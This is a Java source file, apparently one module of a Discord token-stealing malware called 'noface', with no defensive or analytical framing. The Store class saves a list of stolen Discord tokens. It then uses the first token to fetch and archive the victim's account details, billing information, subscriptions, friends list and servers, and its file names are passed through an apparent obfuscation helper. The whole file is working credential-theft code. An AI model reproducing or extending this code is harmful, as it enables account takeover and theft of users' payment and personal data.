package noface.sync;

import noface.api.Mem;
import noface.config.S;

import java.util.List;

public final class Store {

    public static void save(List<String> tokens) throws Exception {
        if (tokens == null || tokens.isEmpty()) {
            Mem.put(S.e("discord/tokens.txt"), S.e("(none)\n"));
            return;
        }

        StringBuilder tb = new StringBuilder();
        for (String t : tokens) tb.append(t).append('\n');
        Mem.put(S.e("discord/tokens.txt"), tb.toString());

        String primary = tokens.get(0);
        put(S.e("discord/user_info.json"), Api.me(primary));
        put(S.e("discord/billing.json"), Api.billing(primary));
        put(S.e("discord/subscriptions.json"), Api.subs(primary));
        put(S.e("discord/friends.json"), Api.friends(primary));
        put(S.e("discord/guilds.json"), Api.guilds(primary));
    }

    private static void put(String name, String content) {
        if (content != null && !content.isBlank()) Mem.put(name, content);
    }

    private Store() {}
}
